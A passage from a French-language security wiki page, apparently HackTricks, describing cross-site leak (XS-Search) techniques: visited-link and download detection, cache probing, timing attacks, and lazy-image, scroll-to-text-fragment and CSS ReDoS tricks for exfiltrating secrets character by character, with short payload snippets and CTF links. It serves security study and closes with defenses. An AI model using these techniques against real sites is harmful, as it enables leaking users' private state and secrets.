Malgré ces restrictions, il est possible de discerner l'état visité d'un lien de manière indirecte. Une technique consiste à tromper l'utilisateur pour qu'il interagisse avec une zone affectée par le CSS, en utilisant spécifiquement la propriété `mix-blend-mode`. Cette propriété permet le mélange d'éléments avec leur arrière-plan, révélant potentiellement l'état visité en fonction de l'interaction de l'utilisateur.

De plus, la détection peut être réalisée sans interaction de l'utilisateur en exploitant les temps de rendu des liens. Étant donné que les navigateurs peuvent rendre les liens visités et non visités différemment, cela peut introduire une différence de temps mesurable dans le rendu. Un proof of concept (PoC) a été mentionné dans un rapport de bogue Chromium, démontrant cette technique en utilisant plusieurs liens pour amplifier la différence de timing, rendant ainsi l'état visité détectable par analyse de timing.

Pour plus de détails sur ces propriétés et méthodes, visitez leurs pages de documentation :

- `:visited` : [Documentation MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
- `getComputedStyle()` : [Documentation MDN](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
- `mix-blend-mode` : [Documentation MDN](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)

### Fuite X-Frame de ContentDocument

- **Méthodes d'Inclusion** : Cadres
- **Différence Détectable** : En-têtes
- **Plus d'infos** : [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
- **Résumé :** Dans Google Chrome, une page d'erreur dédiée est affichée lorsqu'une page est bloquée d'être intégrée sur un site cross-origin en raison des restrictions X-Frame-Options.
- **Exemple de Code** : [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

Dans Chrome, si une page avec l'en-tête `X-Frame-Options` défini sur "deny" ou "same-origin" est intégrée en tant qu'objet, une page d'erreur apparaît. Chrome retourne de manière unique un objet document vide (au lieu de `null`) pour la propriété `contentDocument` de cet objet, contrairement aux iframes ou à d'autres navigateurs. Les attaquants pourraient exploiter cela en détectant le document vide, révélant potentiellement des informations sur l'état de l'utilisateur, surtout si les développeurs définissent de manière incohérente l'en-tête X-Frame-Options, négligeant souvent les pages d'erreur. La sensibilisation et l'application cohérente des en-têtes de sécurité sont cruciales pour prévenir de telles fuites.

### Détection de Téléchargement

- **Méthodes d'Inclusion** : Cadres, Pop-ups
- **Différence Détectable** : En-têtes
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
- **Résumé :** Un attaquant peut discerner les téléchargements de fichiers en utilisant des iframes ; l'accessibilité continue de l'iframe implique un téléchargement de fichier réussi.
- **Exemple de Code** : [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

L'en-tête `Content-Disposition`, spécifiquement `Content-Disposition: attachment`, indique au navigateur de télécharger le contenu plutôt que de l'afficher en ligne. Ce comportement peut être exploité pour détecter si un utilisateur a accès à une page qui déclenche un téléchargement de fichier. Dans les navigateurs basés sur Chromium, il existe quelques techniques pour détecter ce comportement de téléchargement :

1. **Surveillance de la Barre de Téléchargement** :
- Lorsqu'un fichier est téléchargé dans les navigateurs basés sur Chromium, une barre de téléchargement apparaît en bas de la fenêtre du navigateur.
- En surveillant les changements de la hauteur de la fenêtre, les attaquants peuvent déduire l'apparition de la barre de téléchargement, suggérant qu'un téléchargement a été initié.
2. **Navigation de Téléchargement avec des Iframes** :
- Lorsqu'une page déclenche un téléchargement de fichier en utilisant l'en-tête `Content-Disposition: attachment`, cela ne provoque pas un événement de navigation.
- En chargeant le contenu dans une iframe et en surveillant les événements de navigation, il est possible de vérifier si la disposition du contenu provoque un téléchargement de fichier (pas de navigation) ou non.
3. **Navigation de Téléchargement sans Iframes** :
- Semblable à la technique iframe, cette méthode implique d'utiliser `window.open` au lieu d'une iframe.
- Surveiller les événements de navigation dans la nouvelle fenêtre ouverte peut révéler si un téléchargement de fichier a été déclenché (pas de navigation) ou si le contenu est affiché en ligne (navigation se produit).

Dans les scénarios où seuls les utilisateurs connectés peuvent déclencher de tels téléchargements, ces techniques peuvent être utilisées pour déduire indirectement l'état d'authentification de l'utilisateur en fonction de la réponse du navigateur à la demande de téléchargement.

### Contournement de Cache HTTP Partitionné <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

- **Méthodes d'Inclusion** : Pop-ups
- **Différence Détectable** : Timing
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
- **Résumé :** Un attaquant peut discerner les téléchargements de fichiers en utilisant des iframes ; l'accessibilité continue de l'iframe implique un téléchargement de fichier réussi.
- **Exemple de Code** : [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (de [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

> [!WARNING]
> C'est pourquoi cette technique est intéressante : Chrome a maintenant **le partitionnement de cache**, et la clé de cache de la page nouvellement ouverte est : `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, mais si j'ouvre une page ngrok et que j'utilise fetch dedans, la clé de cache sera : `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, la **clé de cache est différente**, donc le cache ne peut pas être partagé. Vous pouvez trouver plus de détails ici : [Gagner en sécurité et en confidentialité en partitionnant le cache](https://developer.chrome.com/blog/http-cache-partitioning/)\
> (Commentaire de [**ici**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

Si un site `example.com` inclut une ressource de `*.example.com/resource`, alors cette ressource aura la **même clé de cache** que si la ressource était directement **demandée par navigation de niveau supérieur**. Cela est dû au fait que la clé de cache est constituée de _eTLD+1_ de niveau supérieur et de _eTLD+1_ de cadre.

Parce qu'accéder au cache est plus rapide que de charger une ressource, il est possible d'essayer de changer l'emplacement d'une page et de l'annuler 20 ms (par exemple) après. Si l'origine a été changée après l'arrêt, cela signifie que la ressource a été mise en cache.\
Ou pourrait simplement **envoyer un fetch à la page potentiellement mise en cache et mesurer le temps qu'il faut**.

### Redirection Manuelle <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Méthodes d'Inclusion** : Fetch API
- **Différence Détectable** : Redirections
- **Plus d'infos** : [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7_0_1234)
- **Résumé :** Il est possible de savoir si une réponse à une requête fetch est une redirection
- **Exemple de Code** :

![](<../../images/image (769).png>)

### Fetch avec AbortController <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

- **Méthodes d'Inclusion** : Fetch API
- **Différence Détectable** : Timing
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
- **Résumé :** Il est possible d'essayer de charger une ressource et d'annuler avant qu'elle ne soit chargée. Selon si une erreur est déclenchée, la ressource a été ou n'a pas été mise en cache.
- **Exemple de Code** : [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Utilisez _**fetch**_ et _**setTimeout**_ avec un **AbortController** pour détecter si la **ressource est mise en cache** et pour évincer une ressource spécifique du cache du navigateur. De plus, le processus se déroule sans mettre en cache de nouveau contenu.

### Pollution de Script

- **Méthodes d'Inclusion** : Éléments HTML (script)
- **Différence Détectable** : Contenu de la Page
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
- **Résumé :** Il est possible de **surcharger des fonctions intégrées** et de lire leurs arguments même depuis **un script cross-origin** (qui ne peut pas être lu directement), cela pourrait **divulguer des informations précieuses**.
- **Exemple de Code** : [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Travailleurs de Service <a href="#service-workers" id="service-workers"></a>

- **Méthodes d'Inclusion** : Pop-ups
- **Différence Détectable** : Contenu de la Page
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
- **Résumé :** Mesurer le temps d'exécution d'un web en utilisant des travailleurs de service.
- **Exemple de Code** :

Dans le scénario donné, l'attaquant prend l'initiative d'enregistrer un **travailleur de service** dans l'un de ses domaines, spécifiquement "attacker.com". Ensuite, l'attaquant ouvre une nouvelle fenêtre sur le site web cible depuis le document principal et demande au **travailleur de service** de commencer un chronomètre. Alors que la nouvelle fenêtre commence à se charger, l'attaquant navigue la référence obtenue dans l'étape précédente vers une page gérée par le **travailleur de service**.

À l'arrivée de la requête initiée dans l'étape précédente, le **travailleur de service** répond avec un code d'état **204 (Pas de Contenu)**, terminant effectivement le processus de navigation. À ce stade, le **travailleur de service** capture une mesure du chronomètre initié plus tôt à l'étape deux. Cette mesure est influencée par la durée du JavaScript causant des retards dans le processus de navigation.

> [!WARNING]
> Dans un timing d'exécution, il est possible d'**éliminer** les **facteurs réseau** pour obtenir des **mesures plus précises**. Par exemple, en chargeant les ressources utilisées par la page avant de la charger.

### Timing de Fetch

- **Méthodes d'Inclusion** : Fetch API
- **Différence Détectable** : Timing (généralement dû au Contenu de la Page, Code d'État)
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
- **Résumé :** Utilisez [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pour mesurer le temps qu'il faut pour effectuer une requête. D'autres horloges pourraient être utilisées.
- **Exemple de Code** : [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Timing Cross-Window

- **Méthodes d'Inclusion** : Pop-ups
- **Différence Détectable** : Timing (généralement dû au Contenu de la Page, Code d'État)
- **Plus d'infos** : [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
- **Résumé :** Utilisez [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pour mesurer le temps qu'il faut pour effectuer une requête en utilisant `window.open`. D'autres horloges pourraient être utilisées.
- **Exemple de Code** : [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) pour construire et **automatiser facilement des flux de travail** alimentés par les **outils communautaires les plus avancés** au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## Avec HTML ou Réinjection

Ici, vous pouvez trouver des techniques pour exfiltrer des informations d'un HTML cross-origin **en injectant du contenu HTML**. Ces techniques sont intéressantes dans les cas où pour une raison quelconque vous pouvez **injecter du HTML mais vous ne pouvez pas injecter de code JS**.

### Marquage Dangling

{{#ref}}
../dangling-markup-html-scriptless-injection/
{{#endref}}

### Chargement Paresseux d'Images

Si vous devez **exfiltrer du contenu** et que vous pouvez **ajouter du HTML avant le secret**, vous devriez vérifier les **techniques de marquage dangling courantes**.\
Cependant, si pour une raison quelconque vous **DEVEZ** le faire **caractère par caractère** (peut-être que la communication se fait via un hit de cache), vous pouvez utiliser cette astuce.

**Les images** en HTML ont un attribut "**loading**" dont la valeur peut être "**lazy**". Dans ce cas, l'image sera chargée lorsqu'elle sera vue et non pendant le chargement de la page :
```html
<img src=/something loading=lazy >
```
Par conséquent, ce que vous pouvez faire est d'**ajouter beaucoup de caractères inutiles** (par exemple **des milliers de "W"**) pour **remplir la page web avant le secret ou ajouter quelque chose comme** `<br><canvas height="1850px"></canvas><br>.`\
Ensuite, si par exemple notre **injection apparaît avant le drapeau**, l'**image** serait **chargée**, mais si elle apparaît **après** le **drapeau**, le drapeau + les caractères inutiles **empêcheront son chargement** (vous devrez jouer avec la quantité de caractères inutiles à placer). C'est ce qui s'est passé dans [**ce rapport**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Une autre option serait d'utiliser le **scroll-to-text-fragment** si cela est autorisé :

#### Scroll-to-text-fragment

Cependant, vous faites en sorte que le **bot accède à la page** avec quelque chose comme
```
#:~:text=SECR
```
La page web sera quelque chose comme : **`https://victim.com/post.html#:~:text=SECR`**

Où post.html contient les caractères indésirables de l'attaquant et une image à chargement paresseux, puis le secret du bot est ajouté.

Ce texte fera en sorte que le bot accède à tout texte sur la page contenant le texte `SECR`. Comme ce texte est le secret et qu'il est juste **en dessous de l'image**, l'**image ne se chargera que si le secret deviné est correct**. Vous avez donc votre oracle pour **exfiltrer le secret caractère par caractère**.

Un exemple de code pour exploiter cela : [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Chargement d'Image Paresseux Basé sur le Temps

S'il est **impossible de charger une image externe** qui pourrait indiquer à l'attaquant que l'image a été chargée, une autre option serait d'essayer de **deviner le caractère plusieurs fois et de mesurer cela**. Si l'image est chargée, toutes les requêtes prendraient plus de temps que si l'image n'est pas chargée. C'est ce qui a été utilisé dans la [**solution de ce rapport**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **résumée ici :**

{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

### ReDoS

{{#ref}}
../regular-expression-denial-of-service-redos.md
{{#endref}}

### CSS ReDoS

Si `jQuery(location.hash)` est utilisé, il est possible de découvrir via le timing **si un contenu HTML existe**, car si le sélecteur `main[id='site-main']` ne correspond pas, il n'est pas nécessaire de vérifier le reste des **sélecteurs** :
```javascript
$(
"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']"
)
```
### Injection CSS

{{#ref}}
css-injection/
{{#endref}}

## Défenses

Il existe des atténuations recommandées dans [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) ainsi que dans chaque section du wiki [https://xsleaks.dev/](https://xsleaks.dev/). Consultez ces ressources pour plus d'informations sur la façon de se protéger contre ces techniques.

## Références

- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
- [https://xsleaks.dev/](https://xsleaks.dev)
- [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
- [https://xsinator.com/](https://xsinator.com/)
- [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Utilisez [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) pour créer facilement et **automatiser des flux de travail** alimentés par les **outils communautaires les plus avancés** au monde.\
Accédez dès aujourd'hui :

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}
